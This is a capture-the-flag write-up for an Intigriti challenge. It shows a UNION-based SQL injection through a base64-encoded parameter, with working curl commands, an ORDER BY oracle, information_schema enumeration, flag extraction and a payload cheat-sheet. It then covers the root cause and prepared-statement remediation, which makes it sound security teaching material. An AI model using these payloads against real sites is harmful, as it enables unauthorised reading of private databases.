# Intigriti Challenge 0926 — Critter Gallery: UNION-based SQL Injection to Full Database Read

> **Challenge:** Intigriti CTF — September 2026 (0926)
> **Target:** `https://challenge-0926.challenges.intigriti.io/challenge.php`
> **Vulnerability:** UNION-based SQL Injection (CWE-89) in the `GET` parameter `pic`
> **Impact:** Full read access to the `critter_gallery` schema, including the non-public `secret_vault` table
> **Result:** Solved — flag extracted, submission accepted (Medium)
> **Author:** [@andzis11](https://github.com/andzis11)

---

## TL;DR

The `pic` parameter is base64-decoded and then **string-interpolated** into an SQL query:

```sql
SELECT description FROM animals WHERE name = '<base64_decode(pic)>'
```

Base64 is only a transport encoding — it is **not** a security control, because any SQL payload can be base64-encoded too. A single quote breaks out of the string literal, a `UNION SELECT` gives an arbitrary read primitive, and `information_schema` enumerates the rest. The flag lives in `secret_vault.note`, a table the UI never renders.

```
INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

---

## 1. Recon

The landing page is a tiny "critter gallery". A critter is selected through a `pic` parameter, e.g.:

```bash
curl -sS 'https://challenge-0926.challenges.intigriti.io/challenge.php?pic=Zm94'
```

`Zm94` is base64 for `fox`, and the page renders:

```
desc: The red fox is a clever, highly adaptable hunter.
```

Two things stand out:

1. The parameter is **base64** — an obvious attempt to "hide" the input, which usually means the developer is processing it server-side.
2. The decoded value (`fox`) looks like it is matched against a **name** column.

Response headers confirm a PHP backend behind Istio:

```
x-powered-by: PHP/8.2.33
server: istio-envoy
```

## 2. Confirming the injection

Send a single quote as the value. Raw SQL `'` → base64 `Jw==` → URL-encoded `Jw%3D%3D`:

```bash
curl -sS 'https://challenge-0926.challenges.intigriti.io/challenge.php?pic=Jw%3D%3D'
```

Result: **HTTP 200 with a 0-byte body.** A normal request returns ~4 KB of HTML. The query now fails to parse and the page output is aborted (with `display_errors=Off`, so no stack trace). That is a strong signal the input reaches the SQL parser rather than being sanitized.

Note that the same page, when the query is valid but matches **zero** rows, returns a normal 200 with a friendly fallback ("No critter goes by that name yet."). So *0 bytes* ≠ *0 rows* — it specifically means *syntax error*. That distinction is what makes the `ORDER BY` oracle below reliable.

Boolean check — `' OR 1=1-- -` (base64 `JyBPUiAxPTEtLSAt`):

```bash
curl -sS 'https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBPUiAxPTEtLSAt'
```

All **8** descriptions of the `animals` table come back at once, instead of just the one for `fox`. The `WHERE` clause is being stripped → injection confirmed.

## 3. Working out the query shape

The detail query returns a single value, so determine the column count with an `ORDER BY` oracle:

| Payload (raw) | base64 | HTTP | Body |
|---|---|---|---|
| `' ORDER BY 1-- -` | `JyBPUkRFUiBCWSAxLS0gLQ==` | 200 | 4096 B (valid query, 0 rows) |
| `' ORDER BY 2-- -` | `JyBPUkRFUiBCWSAyLS0gLQ==` | 200 | **0 B** (syntax error) |

`ORDER BY 1` succeeds, `ORDER BY 2` breaks the query → the `SELECT` list has **exactly one column**. Reconstructed shape:

```sql
SELECT description FROM animals WHERE name = '<input>'
```

The rendered `description` is also reflected back into the page, so a `UNION SELECT` will print anything we put in that single column.

## 4. Fingerprinting the DBMS

Inject a `UNION SELECT` into the single column:

```bash
# raw: ' UNION SELECT version()-- -
curl -sS 'https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgdmVyc2lvbigpLS0gLQ%3D%3D'
# -> 8.0.46
```

Combining several functions in one request:

```sql
' UNION SELECT CONCAT(database(),' | ',user(),' | ',@@version_comment)-- -
```

```
critter_gallery | gallery@10.18.53.240 | MySQL Community Server - GPL
```

We now know the schema name, the DB user, and that it is MySQL 8.0.46.

## 5. Enumerating schema

**Tables:**

```sql
' UNION SELECT GROUP_CONCAT(table_name)
  FROM information_schema.tables
  WHERE table_schema=database()-- -
```

```
animals,secret_vault
```

**Columns:**

```sql
' UNION SELECT GROUP_CONCAT(table_name,':',column_name)
  FROM information_schema.columns
  WHERE table_schema=database()-- -
```

```
animals:description,animals:id,animals:name,secret_vault:id,secret_vault:note
```

`secret_vault` is never referenced by any page in the gallery — a clear "read me" target.

## 6. Extracting the flag

```sql
' UNION SELECT note FROM secret_vault-- -
```

base64 → `JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0=`

```bash
curl -sS 'https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0%3D'
```

The single-column result is rendered into the description slot:

```
INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

## 7. Payload cheat-sheet

All payloads end with `-- -` (the space after `--` is required by MySQL). Inside the query string, `=`, `+`, and `/` of the base64 value must be percent-encoded (`%3D`, `%2B`, `%2F`).

| Stage | Raw SQL | base64 (`pic`) |
|---|---|---|
| Boolean TRUE | `' OR 1=1-- -` | `JyBPUiAxPTEtLSAt` |
| DBMS version | `' UNION SELECT version()-- -` | `JyBVTklPTiBTRUxFQ1QgdmVyc2lvbigpLS0gLQ==` |
| Schema / user | `' UNION SELECT CONCAT(database(),' | ',user(),' | ',@@version_comment)-- -` | `JyBVTklPTiBTRUxFQ1QgQ09OQ0FUKGRhdGFiYXNlKCksJyB8ICcsdXNlcigpLCcgfCAnLEBAdmVyc2lvbl9jb21tZW50KS0tIC0=` |
| Tables | `' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -` | `JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKS0tIC0=` |
| Columns | `' UNION SELECT GROUP_CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()-- -` | `JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUsJzonLGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpLS0gLQ==` |
| **Flag** | `' UNION SELECT note FROM secret_vault-- -` | `JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0=` |

## 8. Root cause

The application trusts the `pic` parameter after decoding it:

```php
// vulnerable (reconstructed)
$name = base64_decode($_GET['pic'] ?? '');
$sql  = "SELECT description FROM animals WHERE name = '$name'";
$rows = $pdo->query($sql);            // <-- string interpolation = SQLi
```

Encoding the input as base64 gave a false sense of safety. Because *any* byte string is valid base64, the attacker simply encodes the entire SQL payload and the injection survives intact. The value must be **bound**, never concatenated.

## 9. Remediation

Use a real prepared statement with a bound placeholder, and disable emulated prepares:

```php
<?php
declare(strict_types=1);

$pdo = new PDO(
    'mysql:host=127.0.0.1;dbname=critter_gallery;charset=utf8mb4',
    $dbUser, $dbPass,
    [
        PDO::ATTR_ERRMODE          => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_EMULATE_PREPARES => false,      // real server-side prepared statements
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]
);

// strict base64: invalid input -> false, not garbage
$name = base64_decode((string)($_GET['pic'] ?? ''), true);
if ($name === false || $name === '') {
    $name = null;
}

// Bound parameter: quotes, UNION and comments inside the value stay plain data.
$stmt = $pdo->prepare('SELECT description FROM animals WHERE name = ? LIMIT 1');
$stmt->execute([$name]);
$row = $stmt->fetch();

echo htmlspecialchars($row['description'] ?? '', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
```

Defense in depth:

1. **Least privilege.** The app user (`gallery`) should only `SELECT` from the tables it actually needs. It has no business reading `secret_vault` — revoking that access would have prevented the flag leak even with the injection present.
2. **Consistent error handling.** Returning HTTP 200 with a 0-byte body on a SQL error is a free oracle for the attacker. Log server-side (`log_errors=On`, `display_errors=Off`) and return a uniform 500/404 page.
3. **Treat decoded input as raw user input.** Base64 is transport encoding, not sanitization.
4. **Optional whitelist.** If the only valid values are known critter names, check `in_array($name, $allowed, true)` — as an extra layer, not a substitute for prepared statements.

## 10. Takeaways

- **Encoding is not escaping.** Base64/hex/URL-encoding of an input never prevents SQL injection; it only obfuscates.
- **"200 with empty body" is a signal.** Distinguishing *syntax error* (0 bytes) from *valid query, 0 rows* (friendly fallback) is what makes the `ORDER BY` oracle trustworthy.
- **Least privilege is a real control.** The injection existed at the query layer, but the *impact* — reading `secret_vault` — was enabled by an over-privileged DB user.

---

*Write-up published after the challenge window closed (28 Sep 2026, 23:59 UTC), per Intigriti's fair-play policy.*
